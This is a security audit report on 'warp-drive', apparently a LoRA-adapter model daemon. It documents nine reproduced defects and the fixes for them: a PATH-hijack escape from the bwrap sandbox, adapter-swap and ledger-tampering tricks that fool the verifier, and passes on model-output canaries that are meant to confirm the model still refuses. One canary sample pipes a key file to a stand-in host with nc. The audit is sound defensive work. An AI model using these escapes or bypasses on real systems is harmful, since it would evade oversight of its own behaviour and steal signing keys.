# AUDIT-062: Adversarial Runtime, Canary, Verifier, Rollback, Ledger & Sandbox Audit of `Moissanite-Labs/warp-drive` (Arm R6-2)

> **Wave / Round:** Wave 2 — Round 6, Arm R6-2 (`AUDIT-062`)  
> **Owner:** `peer-weaver`  
> **Pinned Target:** `Moissanite-Labs/warp-drive` `main @ e3899d3e0ef7697052e74e7a4f99f510d2b63ad5` (`45` files, `src/warp_modeld/` `11` files / `3,958` lines, zero external runtime dependencies)  
> **Oracle Class & Honest Novelty Tag:** `exact+anchor` | **`N1`** (live-reproduced trust-boundary defects, upstream R5 mutation survivors, zero-float hardened stdlib gates, and reverse-extracted `aletheia v1.4` security patterns; zero inflated `N2` claims)  
> **Governance Covenant (Phases 1–2):** **ZERO GitHub writes** and **100% READ-ONLY** on `symbiosis/round6/repos/warp-drive` (`git status --porcelain` verified clean = `0` dirty files). All upstream mutation testing ran strictly inside isolated temporary copies.

---

## 1. Law-4 Prior-Art Quarantine (`R6-N0`)

Per `symbiosis/round6/cartography/ROUND6_PORTALS.md` §4, established infrastructure and prior expedition tooling are quarantined as **`N0`**:

| Quarantine ID | Quarantined Prior Art / Baseline | Boundary Against `AUDIT-062` (`N1`) |
|---|---|---|
| `R6-N0-02` | Linux `Landlock`, `seccomp-bpf`, `bubblewrap`, `systemd` unit sandboxing, `mkosi`, `btrfs` + UKI rollback | Standard OS isolation primitives are `N0`; our `N1` findings prove concrete bypasses in `warp-sandbox-exec.sh` and declarative-only enforcement gaps. |
| `R6-N0-03` | HMAC-SHA256 hash-chained append-only audit logs (RFC 2104 / Crosby–Wallach) | Cryptographic log chaining is `N0`; our `N1` findings prove concrete duplicate-key smuggling, whitespace-wipe acceptance, and `12/15` R5 mutation survivors in `ledger.py`. |
| `R6-N0-04` | Existing `Moissanite-Labs/warp-drive` `main @ e3899d3` 4-stage verifier architecture | Credited strictly to upstream (`N0`); our `N1` work delivers `9` live-reproduced trust-boundary findings, Issue `#7` independent verification gates, and reverse-extracted `aletheia v1.4` gems. |
| `R6-N0-06`, `R6-N0-07` | Prior verified expedition results (`AUDIT-001`–`060`, `aletheia v1.3.0`) & standard JSON Schema / FSM transitions | Verification instrument only (`N0`), never double-counted as Round-6 novelty. |

---

## 2. Law-2 Steelman & Reverse Extraction (`warp-drive` $\to$ `Foundation-0/aletheia v1.4`)

Before detailing vulnerabilities, `warp-drive@e3899d3` exhibits unusually disciplined zero-dependency security engineering (`0` third-party runtime packages, `0` bare `assert`s in `src/warp_modeld/`, `0` CRLF, `0` local-path leaks, `58` passing tests). Moreover, **`llama_client.chat_completion()` (`llama_client.py:262-270`)** builds an explicit allowlisted payload dict rather than forwarding `raw_params` verbatim (so case-variant `"LORA"` keys in `raw_params` do NOT reach `llama-server` — confirmed non-bug!).

Five production patterns from `warp-drive@e3899d3` are directly worth reverse-extracting into **`Foundation-0/aletheia v1.4`**:

1. **Strict Duplicate-Key JSON Loader (`server.py:21-32`, `loads_strict_json`):** `object_pairs_hook=_reject_duplicate_json_keys` fails closed on duplicate JSON keys at every nesting depth (already killed `M001` in upstream `server.py` mutation testing). Should be adopted uniformly across `aletheia` loaders AND extended inside `warp-drive` to `ledger.py`, `canary.py`, and `cli.py` alongside `parse_constant` rejecting `NaN`/`Infinity`.
2. **Forensic Read-Only Ledger Repair (`ledger.py:330-372`, `repair_ledger`):** Preserves damaged audit logs at `0o400` with a companion `.sha256` file before reseeding, gated on an `>= 8`-char operator confirmation phrase (baseline `e3899d3` writes via `write_bytes`/`write_text` without `O_EXCL`/`fsync`, closed by `WD-LEDGER-01` hardening).
3. **Ancestor-Directory Permission Hardening (`ARCHITECTURE.md:124`, `blueprints/mkosi/harden-image-modes.sh`):** Walks every ancestor directory along verifier/policy paths and strips `go-w` (`0o022`) so unprivileged users cannot rename-swap read-only verifier files. Formalized in `warp_drive_runtime_audit.py::verify_ancestor_dir_modes()` as a candidate `aletheia v1.4 audit-check --strict-ancestors` gate.
4. **Division-Free Integer Cross-Multiplication (`certificate.py`):** Compares scaled numerators against rational bounds via `value * limit_den <= limit_num * radix_scale` with strict `type(x) is int` checks — zero floats, `<1 ms`.
5. **Recursive Anti-Forgery Canary Key Denylist (`canary.py:22-56`, `reject_adapter_supplied_canaries`):** Blocks candidate artifacts from smuggling self-reported pass flags or inline expected outputs (`CS-06` oracle separation).

---

## 3. Law-3 Live-Reproduced Trust-Boundary Findings (`9` Verified, `0` False Positives)

Every finding below was **reproduced live** against unmodified `Moissanite-Labs/warp-drive@e3899d3` (`PYTHONDONTWRITEBYTECODE=1`, `0` repo edits) and closed by a hardened pure-stdlib `⫩` R5 reference gate in `warp_drive_runtime_audit.py`:

| Finding ID | Severity | Exact File & Line Anchor | Live Reproduction Receipt (Unmodified `warp-drive@e3899d3`) | Hardened Gate (`warp_drive_runtime_audit.py`) |
|---|---|---|---|---|
| **`WD-SANDBOX-01`** | **CRITICAL** | `blueprints/sandbox/warp-sandbox-exec.sh:18-29, 47, 56-58, 63`; `landlock-policy.json:13, 20-25`; `seccomp-tool-filter.json:3-5` | **(a) `PATH`-hijack `bwrap` escape:** `command -v bwrap` / `exec bwrap` resolves from caller `PATH`. Live repro with `WARP_TOOL_EXECUTOR_REQUIRED=1` and a 3-line `bwrap` shim earlier in `PATH` exited **`rc=0`, `stdout='ESCAPED_UNSANDBOXED'`** completely unsandboxed! **(b) Unvalidated `WORKTREE` RW bind (`L18-24, 47`):** Never canonicalizes or rejects `explicit_deny` paths (`/run/warp-modeld`, `/var/lib/warp-ledger`, `/etc/warp/keys`, `/var/lib/warp/snapshots`, `/efi`) or `/`, allowing RW mount at `/workspace`. **(c) Declarative-only policies:** `seccomp_in_script=False`, `landlock_in_script=False` — neither JSON policy is loaded/enforced by `warp-sandbox-exec.sh`. *(Policy tension note: `L56-57` mounts `/etc/warp/canaries` RO inside the tool sandbox per `ARCHITECTURE.md:141`, conflicting with `canary.py:588`'s private-canary-plaintext assumption.)* | `validate_sandbox_invocation()` pins `/usr/bin/bwrap` or `/bin/bwrap`, rejects non-absolute/`/`/`..`/any overlap with `explicit_deny`, and requires both Landlock and seccomp enforcement. |
| **`WD-STAGE1-01`** | **CRITICAL** | `src/warp_modeld/fingerprint.py:764-769`; `verifier.py:391-453`; `canary.py:417-421`; `schemas/adapter-bundle.schema.json:26` | **Adapter-swap / unverified GGUF bypass (Issue `#7` bullet 1):** `LlamaAdapterInfo.path` from `llama-server /lora-adapters` is **never read anywhere** in `src/warp_modeld/`. Live repro on unmodified `WarpModeld`: **(a)** `adapter_path=None` mounted `llama_adapter_id=0` with `adapter_file_verified=False` while `llama-server` held `'/var/lib/warp/models/adapters/corpus-f16.gguf'`; **(b)** pointing `adapter_path` to an unrelated local `decoy.gguf` matching `adapter_sha256` reported **`adapter_file_verified=True`** and mounted `id=0` even though `llama-server` loaded a completely different file path! | `verify_loaded_adapter_binding()` binds `bundle.llama_adapter_id` directly to `loaded[id].path`, rejects any decoy path mismatch, and ALWAYS hashes the actual loaded GGUF even when `adapter_path is None`. |
| **`WD-FLUSH-01`** | **CRITICAL** | `src/warp_modeld/verifier.py:235-248, 269-275, 291` | **Fail-open SSM flush on hybrid Attention+SSM models (Issue `#7` bullet 6 / `Qwen3.5-4B`):** `_flush_all_slots()` enforces `missing_banks` confirmation (`L242-248`) and non-null `state_banks` entry **only** under `if needs_lattice:`, NOT under `if needs_ssm:`! Live repro on `CheckpointFingerprint(model_id="Qwen3.5-4B-Q8_0", has_ssm_recurrent=True, has_horizontal_lattice=False)`: when `erase_slot` returned `{"ok": True, "banks_flushed": ["kv_cache"]}` (omitting `"ssm_recurrent"`), `mount_stack()` **SUCCEEDED** and logged a signed receipt with **`banks_requested: ['kv_cache', 'ssm_recurrent'], banks_confirmed: ['kv_cache'], verified_clean: True`**! | `verify_multi_bank_flush()` uniformly requires confirmation AND clean post-erase `slot.state_banks[bank]` status for **every** bank in `required_banks` (`kv_cache`, `ssm_recurrent`, `lattice_horizontal_streams`). |
| **`WD-VERIFIER-01`** | **CRITICAL** | `src/warp_modeld/verifier.py:446-492, 541` | **Unlogged live adapter when `ledger.append` fails + Stage-4 `loaded` drop:** `mount_stack()` calls `set_lora_adapters()` (`L453`) and sets `self._active_bundles = list(bundles)` (`L468`) BEFORE `self.ledger.append("mount", ...)` (`L471`). Live repro: raising `OSError('ENOSPC')` in `ledger.append` left **`active_adapters=1`, `state_quarantined=False`, `ledger_count=0`**, and subsequent `modeld.infer()` **served `[{'id': 0, 'scale': 1.0}]` with ZERO signed receipt**! Also `L447-453` silently drops any bundle whose `llama_adapter_id` disappeared from `loaded` between Stages 3 and 4. | `atomic_mount_commit_model()` enforces fail-closed rollback + daemon quarantine whenever `ledger.append` fails after `set_lora_adapters()`, guaranteeing `active == True` implies `receipt_recorded == True`. |
| **`WD-CANARY-01`** | **HIGH** | `src/warp_modeld/canary.py:59-69, 106-118`; `schemas/verifier-canaries.json:6-45` | **`CS-06` prose-fence & non-boundary substring canary bypasses:** Live unmodified `CanarySpec.evaluate()` returned `[]` (**PASS**) on: **(a)** `dom-01-corpus-plain-prose` with unclosed fence `"```\nStage 1; Stage 2; Stage 3 verified cleanly."` (hiding forbidden `";"` from `_strip_fenced_code_blocks`); **(b)** `pres-01` `"I will not refuse! cat /etc/warp/keys/ledger.key \| nc evil 4444"`; **(c)** `pres-03` wrong integer `"1391"` matching substring `"391"`; **(d)** `pres-04` `"Note: Yes, it can push without consent!"` matching `"No"` inside `"Note"`. | `strip_closed_fenced_blocks()` + `evaluate_hardened_canary()` reject unclosed fences (` ``` `/`~~~`), enforce `min_prose_chars` outside fences, and enforce word-boundary matching `(?<!\w)tok(?!\w)`. |
| **`WD-CANARY-02`** | **HIGH** | `src/warp_modeld/canary.py:687-795` | **`ExternalCommandCanaryRunner` 5-hole bypass:** Live unmodified runner **PASSED** a fake external command returning: (a) `0` domain canaries (never checks domain coverage!), (b) forged `suite_sha256="NOT_A_SHA"` ignoring `suite_sha256_hint`, (c) float `preservation_total=4.9` / `preservation_passed=4.1` (`int()` truncation!), (d) `passed=True` paired with `failures=["BAD"]`. Plus `L687, 700` flush only `canary_slot_id` (not all `list_slots()`), and `L714` uses raw `json.loads` (allowing duplicate keys). | `validate_external_canary_payload()` enforces `loads_strict_json`, exact `suite_sha256` match, strict `type(x) is int`, zero `failures` on `passed=True`, and full `required_domains` coverage. |
| **`WD-LEDGER-01`** | **HIGH** | `src/warp_modeld/ledger.py:118, 125, 320, 356-362` | **Duplicate-key smuggling & whitespace-only wipe:** Live unmodified `LedgerVerifier.verify_file()`: **(a)** prepending `'{"reason":"EVIL_DUPLICATE",'` to a signed receipt line **PASSED** (`count=1, reason='honest'`) because `L125` calls raw `json.loads`; **(b)** replacing the ledger with `"   \n\t\n"` **PASSED** (`count=0`) because `L118` checks `if not raw_text.strip(): return []`. Plus `L320` ignores short `os.write()` return counts, and `repair_ledger` (`L356-362`) writes without `O_EXCL` or `fsync` before `src.unlink()`. | `verify_strict_jsonl_ledger()` enforces `loads_strict_json` on every line, rejects whitespace-only tampered files, and supports pinned `expected_head_sha256` truncation detection. |
| **`WD-SERVER-01`** | **HIGH** | `src/warp_modeld/server.py:131, 179, 213, 253-254, 262-263`; `llama_client.py:102, 114, 119`; `cli.py:31, 72`; `schemas/modeld-config.example.json:3` | **RPC boolean coercion, `NaN` JSON, socket `umask` TOCTOU & proxy/redirect:** Live unmodified `_WarpUnixStreamServer.dispatch_line()`: **(a)** `warp_set_learning({"enabled": "false"})` evaluated `bool("false") == True` and **re-enabled learning (`learning_enabled=True`)**; **(b)** `warp_infer({"temperature": "NaN"})` succeeded (`error=None`) and serialized non-RFC-8259 `NaN` (`llama_client.py:114` omits `allow_nan=False`). Also `server.py:253-254` calls `os.chmod` *after* `bind()` (umask TOCTOU), `cli.py:72` does not reject world-accessible `socket_mode` (and `cli.py:31` uses raw `json.loads`), `server.py:131` accepts non-list iterables as `bundles`, and `llama_client.py:119` uses default `urlopen` (honoring `HTTP_PROXY` and HTTP 3xx redirects despite `require_localhost=True`). | `validate_rpc_params()` + `verify_safe_llama_endpoint()` enforce strict `bool` on `enabled`, finite bounded `temperature`/`top_p`, non-world-accessible `socket_mode`, `ProxyHandler({})`, and 3xx redirect refusal. |
| **`WD-FP-01`** | **MEDIUM** | `src/warp_modeld/fingerprint.py:169-172, 271-279, 565-575, 615`; `tests/test_stage4_rollback_ledger.py:112, 122`; `tests/test_live_llama_smoke.py:140` | **Lattice `width=0`, one-sided `weft` flags & test bare `assert`s:** Live unmodified `CheckpointFingerprint(has_horizontal_lattice=True, lattice_layers=4, lattice_width=0)` is **accepted** (`L169` checks only `layers <= 0`); `AdapterBundle.from_weft_binding` (`L565-575, 615`) skips validating `weft_manifest["runtime_flags_sha256"]` when `"runtime_flags"` is absent, and `CheckpointFingerprint.from_weft_binding` (`L271-279`) drops state-bank flags; `aletheia v1.3.0 audit-check` flags `3` bare `assert`s in tests (`test_stage4_rollback_ledger.py:112, 122`; `test_live_llama_smoke.py:140`) stripped under `-O`. | `validate_checkpoint_lattice_dims()` + `verify_weft_runtime_flags_binding()` enforce `layers > 0 and width > 0` and unconditional `runtime_flags_sha256` agreement. |

---

## 4. Upstream `aletheia v1.3.0 mutate` Trust-Path Census (Isolated `/tmp` Copy)

Running `aletheia v1.3.0 mutate` on an isolated temporary copy of `warp-drive@e3899d3` against its paired upstream unit suites exposed severe R5 guard masking:

| Upstream Module | Paired Upstream Test Suite | Mutants Killed | Kill Rate | Key Surviving Trust-Path Guards |
|---|---|---:|---:|---|
| `src/warp_modeld/ledger.py` | `tests.test_stage4_rollback_ledger` | **`3 / 15`** | **`20.0%`** | **`12` survivors:** `M001` (`L39` `<16`-byte key), `M002` (`L41` empty `key_id`), `M003` (`L122` blank line), `M004` (`L129` non-dict), `M005` (`L154` missing keys), `M007` (`L160` `seq` check masked by `L193`), `M008` (`L164` `slots_flushed` int check), `M009` (`L168` `VALID_EVENTS`), `M010` (`L170` `prev_receipt_sha256` masked by `L160`), `M011` (`L193` `receipt_sha256` masked on 2-line chain), `M012` (`L196` `sig_alg`/`key_id`), `M014` (`L269` `append` event check). |
| `src/warp_modeld/server.py` | `tests.test_end_to_end_daemon` | **`1 / 3`** | **`33.33%`** | `M001` (`L24` duplicate JSON key) **KILLED**; **`2` survivors:** `M002` (`L209` non-list `messages`), `M003` (`L223` non-string `prompt`). |

**Why `M007`/`M010`/`M011` survived in `ledger.py`:** Upstream tamper tests mutate two invariants simultaneously (e.g., mutating `seq` without recomputing `receipt_sha256`, or deleting line 1 so both `seq` and `prev_receipt_sha256` fail), masking single-guard deletion. Independent Issue `#7` tests must isolate each invariant on freshly re-signed single-record fixtures!

---

## 5. Verification Receipts & Reproducibility (`symbiosis/round6/arm2-runtime-sandbox/`)

- **Artifacts (pure Python 3 stdlib, zero floats in JSON, zero bare asserts, LF-only, zero local-path leaks):**
  - `warp_drive_runtime_audit.py` (`sha256: a25ce65ab0484beca6c34de65ecbe6aa809c88a4fe740d42a17f0bd4040e392f`, including `AUDIT-062R` hardening against all `5` `#360` adversarial bypasses: POSIX leading `//` & NUL worktree rejection, exact top-level ledger key set, non-empty required banks + explicit `active_lora_ids`/`tokens_or_layers`, full canonical ancestor-chain & strict `int` mode enforcement, top-level external canary verdict flags, RPC `messages`/`prompt`/bounded `socket_mode`, and strict `int` `bundle_llama_id`)
  - `test_warp_drive_runtime_r5.py` (`-I`-safe `sys.path` guard, recursive zero-float check, full refusal & `#360` regression suite)
  - `warp_drive_runtime_certificate.json` (`sha256: a05e476f121031f987cf35ac4115b18e5065ce70b01a324174273c945c1288c8`, zero floats, `21/21` hardened gates PASS, `9/9` live read-only anchors verified)
  - `WARP_DRIVE_RUNTIME_SANDBOX_REPORT.md` (this report)
- **Exact Reproduction Commands:**
  ```bash
  # 1. Regenerate zero-float JSON certificate (4/4 isolated -I bit-identical)
  python3 -I -B warp_drive_runtime_audit.py --json > warp_drive_runtime_certificate.json

  # 2. Direct 4-mode isolated -I R1-R5 unit & refusal suite
  python3 -I -B test_warp_drive_runtime_r5.py
  python3 -I -O -B test_warp_drive_runtime_r5.py
  python3 -I -B -W error test_warp_drive_runtime_r5.py
  python3 -I -O -B -W error test_warp_drive_runtime_r5.py

  # 3. Aletheia v1.3.0 audit-check (4 files, 0 defects, 2/2 isolated -I R4 PASS)
  PYTHONPATH=../../../publish/aletheia python3 -B -W error -m aletheia audit-check . \
    --scripts warp_drive_runtime_audit.py test_warp_drive_runtime_r5.py

  # 4. Aletheia v1.3.0 mutate (34/34 = 100.0% KILLED, 0 SURVIVORS)
  PYTHONPATH=../../../publish/aletheia python3 -B -W error -m aletheia mutate \
    warp_drive_runtime_audit.py --work-root . --add-cwd \
    --test-cmd "python3 -I -O -B -W error test_warp_drive_runtime_r5.py"
  ```

---

## 6. Falsification Criteria

`AUDIT-062` is immediately falsified if:
1. Any of the `9` findings (`WD-SANDBOX-01`, `WD-STAGE1-01`, `WD-FLUSH-01`, `WD-VERIFIER-01`, `WD-CANARY-01`, `WD-CANARY-02`, `WD-LEDGER-01`, `WD-SERVER-01`, `WD-FP-01`) fails live reproduction against `Moissanite-Labs/warp-drive @ e3899d3e0ef7697052e74e7a4f99f510d2b63ad5` at the exact cited lines;
2. Any hardened reference gate in `warp_drive_runtime_audit.py` admits a real bypass against the threat model documented in §§3–4;
3. Any `float` appears anywhere in `warp_drive_runtime_certificate.json`, any local-path leak/CRLF/bare-`assert` exists in `arm2-runtime-sandbox/`, any of the `4` isolated `-I` modes diverges, or any R5 mutant survives `aletheia v1.3.0 mutate` (`34/34`);
4. Any modification occurred on `symbiosis/round6/repos/warp-drive` or any GitHub write occurred in Phases 1–2.
